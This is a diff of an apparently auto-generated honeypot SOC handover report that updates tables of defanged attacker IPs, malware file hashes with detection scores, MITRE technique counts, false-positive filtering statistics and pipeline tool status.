-| `120.136.25[.]236` | 1 | 2026-08-22 14:37 | 2026-08-22 14:37 | 6s | 0 | `T1592` | 🟢 LOW |
-| `120.48.28[.]60` | 1 | 2026-08-22 13:43 | 2026-08-22 13:45 | 120s | 0 | `T1592` | 🟢 LOW |
-| `125.227.240[.]43` | 1 | 2026-08-22 14:06 | 2026-08-22 14:06 | 5s | 0 | `T1592` | 🟢 LOW |
-| `138.59.141[.]38` | 1 | 2026-08-22 13:03 | 2026-08-22 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
-| `213.109.81[.]253` | 1 | 2026-08-22 14:06 | 2026-08-22 14:06 | 12s | 0 | `T1592` | 🟢 LOW |
-| `213.230.86[.]108` | 1 | 2026-08-22 12:55 | 2026-08-22 12:55 | 13s | 0 | `T1592` | 🟢 LOW |
-| `45.148.10[.]152` | 1 | 2026-08-22 13:03 | 2026-08-22 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
-| `45.79.207[.]71` | 1 | 2026-08-22 13:37 | 2026-08-22 13:37 | 0s | 0 | `T1592` | 🟢 LOW |
-| `65.49.1[.]192` | 1 | 2026-08-22 12:59 | 2026-08-22 12:59 | 0s | 0 | `T1592` | 🟢 LOW |
-| `78.66.45[.]101` | 1 | 2026-08-22 13:33 | 2026-08-22 13:35 | 120s | 0 | `T1592` | 🟢 LOW |
-| `85.217.149[.]16` | 1 | 2026-08-22 13:47 | 2026-08-22 13:47 | 0s | 0 | `T1592` | 🟢 LOW |
-| `85.24.246[.]216` | 1 | 2026-08-22 14:28 | 2026-08-22 14:30 | 120s | 0 | `T1592` | 🟢 LOW |
-| `89.222.217[.]32` | 1 | 2026-08-22 13:55 | 2026-08-22 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
-| `91.233.83[.]203` | 1 | 2026-08-22 14:53 | 2026-08-22 14:53 | 0s | 0 | `T1592` | 🟢 LOW |
+| `139.199.80[.]137` | **5** | 2026-08-22 15:00 | 2026-08-22 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
+| `74.128.77[.]247` | **4** | 2026-08-22 15:32 | 2026-08-22 15:33 | 0m | 0 | `T1592` | 🟢 LOW |
+| `172.127.181[.]140` | **3** | 2026-08-22 16:05 | 2026-08-22 16:07 | 0m | 0 | `T1592` | 🟢 LOW |
+| `208.96.121[.]222` | **3** | 2026-08-22 16:35 | 2026-08-22 16:36 | 0m | 0 | `T1592` | 🟢 LOW |
+| `68.33.233[.]154` | **3** | 2026-08-22 16:03 | 2026-08-22 16:04 | 0m | 0 | `T1592` | 🟢 LOW |
+| `165.169.161[.]242` | **2** | 2026-08-22 16:12 | 2026-08-22 16:13 | 0m | 0 | `T1592` | 🟢 LOW |
+| `46.59.88[.]232` | **2** | 2026-08-22 15:25 | 2026-08-22 16:32 | 4m | 0 | `T1592` | 🟢 LOW |
+| `104.152.52[.]207` | 1 | 2026-08-22 15:16 | 2026-08-22 15:16 | 0s | 0 | `T1592` | 🟢 LOW |
+| `120.48.22[.]219` | 1 | 2026-08-22 15:13 | 2026-08-22 15:15 | 120s | 0 | `T1592` | 🟢 LOW |
+| `121.99.190[.]167` | 1 | 2026-08-22 16:48 | 2026-08-22 16:48 | 0s | 0 | `T1592` | 🟢 LOW |
+| `148.3.11[.]214` | 1 | 2026-08-22 16:28 | 2026-08-22 16:28 | 12s | 0 | `T1592` | 🟢 LOW |
+| `200.112.142[.]56` | 1 | 2026-08-22 16:08 | 2026-08-22 16:09 | 10s | 0 | `T1592` | 🟢 LOW |
+| `37.54.214[.]189` | 1 | 2026-08-22 15:40 | 2026-08-22 15:41 | 12s | 0 | `T1592` | 🟢 LOW |
+| `39.104.64[.]139` | 1 | 2026-08-22 16:07 | 2026-08-22 16:07 | 8s | 0 | `T1592` | 🟢 LOW |
+| `45.229.85[.]227` | 1 | 2026-08-22 16:28 | 2026-08-22 16:28 | 0s | 0 | `T1592` | 🟢 LOW |
+| `45.229.85[.]230` | 1 | 2026-08-22 16:29 | 2026-08-22 16:29 | 0s | 0 | `T1592` | 🟢 LOW |
+| `45.79.207[.]252` | 1 | 2026-08-22 15:36 | 2026-08-22 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
+| `49.124.151[.]22` | 1 | 2026-08-22 15:13 | 2026-08-22 15:13 | 0s | 0 | `T1592` | 🟢 LOW |
+| `78.66.44[.]246` | 1 | 2026-08-22 16:50 | 2026-08-22 16:50 | 0s | 0 | `T1592` | 🟢 LOW |
+| `83.226.56[.]106` | 1 | 2026-08-22 16:50 | 2026-08-22 16:52 | 120s | 0 | `T1592` | 🟢 LOW |
+| `85.217.149[.]19` | 1 | 2026-08-22 15:28 | 2026-08-22 15:28 | 0s | 0 | `T1592` | 🟢 LOW |
+| `87.236.176[.]84` | 1 | 2026-08-22 15:08 | 2026-08-22 15:08 | 2s | 0 | `T1592` | 🟢 LOW |
+| `89.248.172[.]11` | 1 | 2026-08-22 16:25 | 2026-08-22 16:26 | 31s | 0 | `T1592` | 🟢 LOW |
 
 ---
 
@@ -6646,7 +4884,7 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 | `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
 | `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
 | `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 30/100 | 🟢 LOW | Not in VT |
+| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
 | `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
 | `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
 | `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
@@ -6715,16 +4953,16 @@ _`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38ee
 
 | IP | Country | ISP | Abuse Score | OTX Pulses |
 |---|---|---|---|---|
-| `50.217.255[.]171` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
-| `77.239.124[.]117` | FR | ROCKET & MARINICA LTD | **100** ⚠️ | 18 |
-| `219.129.236[.]174` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
-| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
-| `2.180.7[.]125` | IR | mashhad dsl | **100** ⚠️ | 1 |
-| `43.165.178[.]246` | JP | ACEVILLE PTE.LTD. | **100** ⚠️ | 14 |
-| `66.179.137[.]169` | US | IONOS Inc. | **100** ⚠️ | 1 |
-| `222.92.61[.]242` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
-| `65.20.204[.]88` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
-| `219.73.79[.]33` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 1 |
+| `80.191.253[.]228` | IR | Toseae Ertebatat Parnian Amol | **100** ⚠️ | 2 |
+| `46.4.112[.]25` | DE | Hetzner Online GmbH | **100** ⚠️ | 0 |
+| `120.48.22[.]219` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
+| `104.152.52[.]207` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
+| `39.104.64[.]139` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
+| `172.127.181[.]140` | US | AT&T Enterprises, LLC | **100** ⚠️ | 0 |
+| `74.128.77[.]247` | US | Charter Communications Inc | **100** ⚠️ | 0 |
+| `220.246.46[.]144` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
+| `165.169.161[.]242` | RE | Reunicable SAS | **100** ⚠️ | 0 |
+| `89.248.172[.]11` | NL | FiberXpress BV | **100** ⚠️ | 50 |
 
 ---
 
@@ -6732,24 +4970,25 @@ _`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38ee
 
 | TTP ID | Count |
 |---|---|
-| [T1078](https://attack.mitre.org/techniques/T1078) | 183 |
-| [T1592](https://attack.mitre.org/techniques/T1592) | 141 |
+| [T1592](https://attack.mitre.org/techniques/T1592) | 133 |
+| [T1078](https://attack.mitre.org/techniques/T1078) | 125 |
 | [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
-| [T1083](https://attack.mitre.org/techniques/T1083) | 58 |
-| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 58 |
+| [T1083](https://attack.mitre.org/techniques/T1083) | 57 |
+| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 57 |
 
 ---
 
-## 🔕 False Positive Summary (9 filtered)
+## 🔕 False Positive Summary (23 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 13 below threshold 25 | 1 |
-| AbuseIPDB score 18 below threshold 25 | 1 |
-| AbuseIPDB score 19 below threshold 25 | 1 |
-| AbuseIPDB score 20 below threshold 25 | 3 |
-| AbuseIPDB score 21 below threshold 25 | 1 |
-| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |
+| AbuseIPDB score 0 below threshold 25 | 5 |
+| AbuseIPDB score 12 below threshold 25 | 1 |
+| AbuseIPDB score 17 below threshold 25 | 2 |
+| AbuseIPDB score 19 below threshold 25 | 3 |
+| AbuseIPDB score 4 below threshold 25 | 1 |
+| AbuseIPDB score 5 below threshold 25 | 2 |
+| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -6760,19 +4999,19 @@ _`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38ee
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26  | Incident Timeline Generator | ✅ 232 cases |
-| Tool 34  | Credential Extractor        | ✅ 204 attempts |
-| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
-| Tool 36  | Command Clustering          | ✅ 2 clusters |
-| Tool 27  | Threat Intel Feeder         | ✅ 72 IPs enriched |
-| Tool 29  | False Positive Tracker      | ✅ 9 filtered (3.9%) |
+| Tool 26  | Incident Timeline Generator | ✅ 186 cases |
+| Tool 34  | Credential Extractor        | ✅ 141 attempts |
+| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
+| Tool 36  | Command Clustering          | ✅ 4 clusters |
+| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
+| Tool 29  | False Positive Tracker      | ✅ 23 filtered (12.4%) |
 | Tool 30  | Metric Exporter             | ✅ stats.json written |
-| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
+| Tool 30b | ASN Clustering              | ✅ 71 ASNs |
 | Tool 31  | Malware Analyzer            | ✅ 49 files |
 | Tool 33  | YARA Classifier             | ✅ 16 classified |
 | Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |
 
-> **Report grouping:** 183 priority case(s) shown individually · 23 recon entry/entries in table (9 group(s) consolidating 26 session(s)).
+> **Report grouping:** 125 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 22 session(s)).
 
 ---
 
@@ -6807,4 +5046,4 @@ _`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38ee
 
 _Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
 _Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
-_Report time: 2026-08-22T16:29:49Z_
+_Report time: 2026-08-22T18:37:22Z_
